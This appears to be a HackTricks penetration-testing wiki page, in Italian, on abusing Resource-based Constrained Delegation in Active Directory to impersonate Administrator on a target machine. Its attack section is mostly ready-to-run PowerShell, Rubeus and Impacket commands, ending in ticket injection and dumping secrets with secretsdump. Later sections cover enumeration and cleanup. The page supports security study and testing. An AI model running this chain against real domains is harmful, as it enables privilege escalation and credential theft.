# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

Questo è simile alla base [Constrained Delegation](constrained-delegation.md) ma **invece** di dare permessi a un **oggetto** per **impersonare qualsiasi utente contro una macchina**. La Resource-based Constrained Delegation **imposta** nell'**oggetto chi può impersonare qualsiasi utente contro di esso**.

In questo caso, l'oggetto vincolato avrà un attributo chiamato _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ con il nome dell'utente che può impersonare qualsiasi altro utente contro di esso.

Un'altra importante differenza tra questa Constrained Delegation e le altre deleghe è che qualsiasi utente con **permessi di scrittura su un account macchina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) può impostare il **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (nelle altre forme di Delegation erano necessari privilegi di amministratore di dominio).

### New Concepts

Tornando alla Constrained Delegation, si è detto che il **`TrustedToAuthForDelegation`** flag all'interno del valore _userAccountControl_ dell'utente è necessario per eseguire un **S4U2Self.** Ma non è completamente vero.\
La realtà è che anche senza quel valore, puoi eseguire un **S4U2Self** contro qualsiasi utente se sei un **servizio** (hai un SPN) ma, se hai **`TrustedToAuthForDelegation`** il TGS restituito sarà **Forwardable** e se **non hai** quel flag il TGS restituito **non sarà** **Forwardable**.

Tuttavia, se il **TGS** utilizzato in **S4U2Proxy** **NON è Forwardable**, cercare di abusare di una **basic Constrain Delegation** **non funzionerà**. Ma se stai cercando di sfruttare una **Resource-Based constrain delegation, funzionerà**.

### Attack structure

> Se hai **privilegi di scrittura equivalenti** su un **account Computer** puoi ottenere **accesso privilegiato** in quella macchina.

Supponiamo che l'attaccante abbia già **privilegi di scrittura equivalenti sull'computer vittima**.

1. L'attaccante **compromette** un account che ha un **SPN** o **ne crea uno** (“Service A”). Nota che **qualsiasi** _Admin User_ senza alcun altro privilegio speciale può **creare** fino a 10 oggetti Computer (**_MachineAccountQuota_**) e impostarli con un **SPN**. Quindi l'attaccante può semplicemente creare un oggetto Computer e impostare un SPN.
2. L'attaccante **abusa del suo privilegio di SCRITTURA** sull'computer vittima (ServiceB) per configurare **la delega vincolata basata su risorse per consentire a ServiceA di impersonare qualsiasi utente** contro quell'computer vittima (ServiceB).
3. L'attaccante utilizza Rubeus per eseguire un **attacco S4U completo** (S4U2Self e S4U2Proxy) da Service A a Service B per un utente **con accesso privilegiato a Service B**.
1. S4U2Self (dall'account SPN compromesso/creato): Chiedi un **TGS di Administrator a me** (Non Forwardable).
2. S4U2Proxy: Usa il **TGS non Forwardable** del passo precedente per chiedere un **TGS** da **Administrator** all'**host vittima**.
3. Anche se stai usando un TGS non Forwardable, poiché stai sfruttando la delega vincolata basata su risorse, funzionerà.
4. L'attaccante può **pass-the-ticket** e **impersonare** l'utente per ottenere **accesso al servizio vittima ServiceB**.

Per controllare il _**MachineAccountQuota**_ del dominio puoi usare:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Attacco

### Creazione di un Oggetto Computer

Puoi creare un oggetto computer all'interno del dominio utilizzando **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configurazione della Delegazione Constrainata Basata sulle Risorse

**Utilizzando il modulo PowerShell activedirectory**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Utilizzando powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Eseguire un attacco S4U completo (Windows/Rubeus)

Prima di tutto, abbiamo creato il nuovo oggetto Computer con la password `123456`, quindi abbiamo bisogno dell'hash di quella password:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Questo stamperà gli hash RC4 e AES per quell'account.\
Ora, l'attacco può essere eseguito:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Puoi generare più ticket per più servizi semplicemente chiedendo una volta utilizzando il parametro `/altservice` di Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Nota che gli utenti hanno un attributo chiamato "**Non può essere delegato**". Se un utente ha questo attributo impostato su Vero, non sarai in grado di impersonarlo. Questa proprietà può essere vista all'interno di bloodhound.

### Linux tooling: end-to-end RBCD with Impacket (2024+)

Se operi da Linux, puoi eseguire l'intera catena RBCD utilizzando gli strumenti ufficiali di Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Note
- Se la firma LDAP/LDAPS è obbligatoria, usa `impacket-rbcd -use-ldaps ...`.
- Preferisci le chiavi AES; molti domini moderni limitano RC4. Impacket e Rubeus supportano entrambi flussi solo AES.
- Impacket può riscrivere il `sname` ("AnySPN") per alcuni strumenti, ma ottieni il corretto SPN ogni volta che è possibile (ad es., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Accesso

L'ultima riga di comando eseguirà il **completo attacco S4U e inietterà il TGS** dall'Amministratore all'host vittima in **memoria**.\
In questo esempio è stato richiesto un TGS per il servizio **CIFS** dall'Amministratore, quindi sarai in grado di accedere a **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abuso di diversi ticket di servizio

Scopri di più sui [**ticket di servizio disponibili qui**](silver-ticket.md#available-services).

## Enumerazione, auditing e pulizia

### Enumerare i computer con RBCD configurato

PowerShell (decodifica il SD per risolvere gli SID):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (leggi o svuota con un comando):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Pulizia / ripristino RBCD

- PowerShell (cancellare l'attributo):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Errori di Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Questo significa che kerberos è configurato per non utilizzare DES o RC4 e stai fornendo solo l'hash RC4. Fornisci a Rubeus almeno l'hash AES256 (o fornisci gli hash rc4, aes128 e aes256). Esempio: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Questo significa che l'ora del computer attuale è diversa da quella del DC e kerberos non sta funzionando correttamente.
- **`preauth_failed`**: Questo significa che il nome utente + hash forniti non funzionano per il login. Potresti aver dimenticato di mettere il "$" all'interno del nome utente durante la generazione degli hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Questo può significare:
- L'utente che stai cercando di impersonare non può accedere al servizio desiderato (perché non puoi impersonarlo o perché non ha privilegi sufficienti)
- Il servizio richiesto non esiste (se chiedi un ticket per winrm ma winrm non è in esecuzione)
- Il computer fittizio creato ha perso i suoi privilegi sul server vulnerabile e devi ripristinarli.
- Stai abusando del KCD classico; ricorda che RBCD funziona con ticket S4U2Self non trasferibili, mentre KCD richiede ticket trasferibili.

## Note, relay e alternative

- Puoi anche scrivere il RBCD SD su AD Web Services (ADWS) se LDAP è filtrato. Vedi:

{{#ref}}
adws-enumeration.md
{{#endref}}

- Le catene di relay di Kerberos finiscono frequentemente in RBCD per ottenere SYSTEM locale in un solo passaggio. Vedi esempi pratici end-to-end:

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Riferimenti

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (ufficiale): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/

{{#include ../../banners/hacktricks-training.md}}
